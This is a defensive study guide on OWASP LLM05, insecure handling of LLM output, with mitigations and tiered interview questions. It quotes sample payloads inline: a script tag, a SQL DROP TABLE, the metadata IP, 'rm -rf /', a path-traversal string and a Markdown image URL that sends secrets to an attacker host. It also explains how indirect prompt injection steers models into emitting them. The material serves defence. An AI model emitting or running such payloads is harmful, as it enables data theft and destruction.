Insecure Output Handling (OWASP LLM05)

Domain: AI / LLM Application Security
Frameworks: OWASP Top 10 for LLM Applications — LLM05: Improper Output Handling · MITRE ATLAS (AML.T0051 LLM Prompt Injection chained to downstream execution) · Google SAIF (Input/Output validation controls) · NIST AI RMF (MEASURE / MANAGE)

Overview

Insecure output handling is the failure to treat an LLM's response as untrusted input before it is rendered, executed, or forwarded to a downstream component. The model output crosses a trust boundary into a browser, database, shell, HTTP client, template engine, or file system, and if that sink applies no validation or encoding, the LLM effectively becomes an injection vector for classic web vulnerabilities: XSS, SQL injection, SSRF, OS command injection, and path traversal. This matters because the LLM's output is influenced by attacker-controllable inputs — the user prompt, retrieved RAG documents, and tool results — so an attacker who can steer the model can smuggle a payload straight into a privileged sink. OWASP classifies it as LLM05: Improper Output Handling, distinct from LLM01 (Prompt Injection, the input side) and LLM02 (Sensitive Information Disclosure). The one-line mental model: prompt injection is how you steer the model; insecure output handling is how that steering reaches a dangerous sink.

How It Works

Core Mechanics

A production LLM app rarely returns the model's text straight to a human who reads it inertly. The output is consumed by another component that acts on it: a front end renders it as HTML/Markdown, a code path parses JSON and builds a SQL query, an agent passes it to a tool that makes an HTTP request, or a plugin executes it as shell or code. Each of these is a sink, and each sink has a language it interprets — HTML, SQL, a URL grammar, a shell, a path. Insecure output handling is what happens when text is placed into that sink without being encoded or validated for that language.

The critical trust-boundary error is treating LLM output as trusted because it came from "our own model." It is not trusted. The model is a transformer of untrusted inputs into plausible-looking output — it does not sanitize, and it will faithfully emit <script>, '; DROP TABLE, http://169.254.169.254/, ; rm -rf /, or ../../etc/passwd if the surrounding context nudges it there. The attacker's capability is influence over any input that reaches the context window: the direct prompt, an indirect payload planted in a web page or document that RAG later retrieves, or a poisoned tool result. Their objective is to have the model emit a string that the downstream sink will interpret as code or a command rather than as data. This is the same confused-deputy pattern as classic injection, with the LLM inserted as an intermediary that launders attacker input into "internal" output.

The defense is symmetric to classic web security: apply the sink-appropriate control at the boundary where output enters the sink, not at the model. Each downstream injection maps to a well-understood web-vuln control — contextual output encoding for XSS, parameterized queries for SQLi, egress allowlists for SSRF, argument arrays and sandboxing for command injection, canonicalization plus allowlists for path traversal. Because the model itself provides no guarantees, the boundary control is the control.

Top 3 Critical Mitigations

1. Treat Output as Untrusted and Encode/Validate at Every Sink

The foundational control is a mindset made concrete: the LLM is downstream of untrusted input, so its output is untrusted input to whatever consumes it. Apply the sink-appropriate control at the point the output enters the sink — contextual output encoding for HTML (encode <, >, &, " for the exact context: HTML body, attribute, JS, URL), parameterized queries for SQL, allowlists for URLs and file paths, and argument arrays for process execution. This is not model-side filtering; it is the same boundary discipline that defends any web app, applied at the LLM-to-sink boundary. The trade-off is that encoding must be context-correct — encoding for HTML body but injecting into a JS string context still yields XSS — so the control has to know the exact sink grammar, and blanket "sanitization" is a common failure. The strength is that, unlike guardrails, output encoding is a sound control: correctly encoded data provably cannot break out of its context.

2. Prefer Structured, Constrained Output over Free-Form Text

Instead of taking raw model prose and interpolating it into a sink, force the model to emit a strict schema (JSON with a validated shape, or an enum of allowed actions) and validate that structure before any use. A model that returns {"action": "search", "query": "..."} against a strict validator cannot directly emit <script> into a rendered field, and a tool that accepts only an enumerated action from a fixed set cannot be coerced into an arbitrary shell command. Combine this with least-privilege tool scopes so that even a valid-looking action can only do a narrowly bounded thing. The trade-off is reduced flexibility and the need to handle validation failures gracefully (reject and retry rather than "best effort" parse), but it dramatically shrinks the injection surface by removing free-form text from the dangerous path. This aligns with SAIF's input/output validation and NIST AI RMF's MEASURE function.

3. Sandbox and Least-Privilege the Sinks Themselves

Assume a payload will sometimes get through and limit the blast radius. Run any code, shell, or tool the LLM can drive inside an isolated sandbox — a container or microVM with no ambient credentials, no access to the cloud metadata endpoint, an egress allowlist (or no network), read-only mounts, and a scoped, short-lived token. Add human-in-the-loop confirmation for high-impact actions (writes, payments, deletions, outbound requests to new domains). This is the containment layer behind the boundary controls: output encoding stops the injection, but sandboxing ensures that if command injection or SSRF does fire, it reaches nothing valuable. The trade-off is operational complexity and latency, and the standard caveat that sandboxes and guardrails are probabilistic, not sound — a determined attacker may find an escape — which is exactly why this is defense in depth on top of, not instead of, sink-side encoding. Relevant tooling: gVisor/Firecracker for isolation, egress proxies with allowlists, and output-scanning guardrails (Llama Guard, NeMo Guardrails) as a supplementary, not primary, layer.

Practice Questions

Tier 1 — Fundamentals

  1. What is insecure output handling and why is it OWASP LLM05? It is failing to validate or encode an LLM's output before a downstream component renders or executes it, turning the model into an injection vector for XSS, SQLi, SSRF, command injection, or path traversal. It is LLM05 because it is the output-side counterpart to LLM01 prompt injection. This is asked to confirm you know LLM output is untrusted input to the next component.
  2. Why should you treat LLM output as untrusted? The model transforms attacker-influenceable inputs (prompts, RAG docs, tool results) into output and provides no sanitization guarantee, so its output can carry payloads. This is asked to test the core trust-boundary intuition.
  3. Give a concrete XSS example from an LLM app. A chatbot renders the model's Markdown/HTML answer directly into the DOM; an attacker gets the model to emit <script> (or an image tag with a data-bearing URL) and steals the session. This is asked to see if you can map the abstract risk to a real sink.
  4. How is LLM05 different from LLM01? LLM01 is manipulating the model via input; LLM05 is the model's output reaching a dangerous sink without validation. One is the steering, the other is the impact path. This is asked to check you can separate cause from effect.
  5. What is the classic control for output rendered as HTML? Contextual output encoding plus a strict Content Security Policy, and rendering as plain text where possible. This is asked to confirm you reach for standard web controls, not model-side hacks.

Tier 2 — System Design and Trade-offs

  1. Design safe output handling for a customer-facing chatbot whose answers render in a browser. Never trust the model output: render as plain text or run it through a strict HTML/Markdown sanitizer with an allowlist, apply contextual output encoding per context, set a strict CSP, disable auto-loading of remote images to stop Markdown exfil, and allowlist any link domains. Keep the control at the render boundary in the front end, and add output guardrails only as a secondary layer. This is asked to see if you apply web-security fundamentals at the LLM boundary rather than trusting the model.
  2. An agent builds SQL from user questions. How do you prevent SQLi? Do not let the model emit raw SQL that you concatenate; have it emit structured parameters (filters, fields) against a fixed, parameterized query template, and validate those against an allowlist of columns/operations. Enforce least-privilege DB credentials so even a successful injection is bounded. This is asked to test whether you know parameterization is the sound control and that structured output shrinks the surface.
  3. Your agent fetches URLs the model provides. How do you stop SSRF? Route all egress through a proxy with a domain allowlist, block RFC1918/link-local and the cloud metadata IP (169.254.169.254), disable redirects, and resolve-then-pin the IP to avoid DNS rebinding. Run the fetcher with no ambient cloud credentials. This is asked to test SSRF depth in an agentic context, including metadata-endpoint theft.
  4. How does indirect prompt injection make output handling worse? A poisoned RAG document or web page steers the model to emit a payload, so the attacker controls the sink input without ever touching the prompt directly — the untrusted content is laundered through your "trusted" model. The fix is still sink-side validation, because you cannot rely on cleaning the input. This is asked to connect the input and output sides of the threat model.
  5. Where do you put the control — at the model or at the sink? Why? At the sink, because the model gives no soundness guarantee and probabilistic output filters can be bypassed, whereas correct output encoding and parameterization are provably safe at the boundary. Model-side guardrails are a supplementary layer. This is asked to test whether you understand sound vs probabilistic controls.

Tier 3 — Expert and Deep-Dive

  1. Why can output encoding still fail even when you "sanitize"? Encoding must match the exact sink context; encoding for HTML body but interpolating into a JavaScript string, an HTML attribute, or a URL context leaves an exploitable break-out. Context confusion, not missing encoding, is the usual real-world XSS root cause. This is asked to see if you understand contextual encoding at depth rather than as a checkbox.
  2. How would you architect a code-interpreter feature the LLM can drive, assuming payloads will get through? Execute only in an isolated microVM/container with no network (or a strict egress allowlist), no ambient credentials, no metadata access, read-only mounts, a scoped short-lived token, and resource limits, with human confirmation for high-impact actions. Combine sandbox containment with output validation so a breakout still reaches nothing valuable. This is asked to test defense-in-depth and blast-radius thinking for the highest-impact sink.
  3. Compare constraining output to a schema versus filtering free-form text. Schema constraint with strict validation is deterministic — you reject anything that does not parse to the allowed shape, removing free-form text from the dangerous path — whereas post-hoc filtering of prose is probabilistic and racing an adversary who can encode or obfuscate payloads. Schema-plus-least-privilege scopes the model to an enumerated set of safe actions. This is asked to test whether you prefer sound structural controls over pattern matching.
  4. How can Markdown rendering leak data with no visible XSS? A rendered ![img](https://attacker/x?d=<secret>) auto-loads the attacker URL with exfiltrated data in the query string; no script runs, so CSP script rules and XSS filters miss it. Mitigate by disabling remote image auto-load and allowlisting image/link domains. This is asked to probe subtle exfiltration channels beyond textbook XSS.
  5. In a multi-agent system, agent A's output feeds agent B's tools. Where are the boundaries? Every inter-agent hop is a trust boundary: treat A's output as untrusted input to B, validate/constrain it to B's expected schema before B acts, and apply least-privilege tool scopes and sandboxing per agent so a payload cannot chain across the pipeline. Do not assume "internal" agents are trusted. This is asked to test trust-boundary reasoning in composed agentic systems.

Key Takeaways

  • LLM output is untrusted input to the next component — encode, validate, or parameterize it at every sink, exactly as you would any user input.
  • It is OWASP LLM05 (Improper Output Handling), the output-side counterpart to LLM01 prompt injection; injection often starts as LLM01 and lands as LLM05.
  • Each downstream sink maps to a classic web-vuln control: contextual output encoding + CSP for XSS, parameterized queries for SQLi, egress allowlists for SSRF, argument arrays + sandboxing for command injection, canonicalization + allowlists for path traversal.
  • Put the control at the sink boundary, not the model — output encoding and parameterization are sound; model-side guardrails are probabilistic and only supplementary.
  • Constrain output to a strict schema and enforce least-privilege tool scopes to remove free-form text from dangerous paths.
  • Sandbox the sinks (no ambient creds, no metadata access, egress allowlist, human-in-the-loop for high-impact actions) so a payload that slips through reaches nothing valuable.
  • Indirect injection via RAG/tool content means you cannot trust the input either — sink-side validation is the durable defense.
  • Production one-liner: treat every LLM output as attacker-controlled and apply the sink-appropriate encoding/validation at each downstream boundary, backed by least privilege and sandboxing.
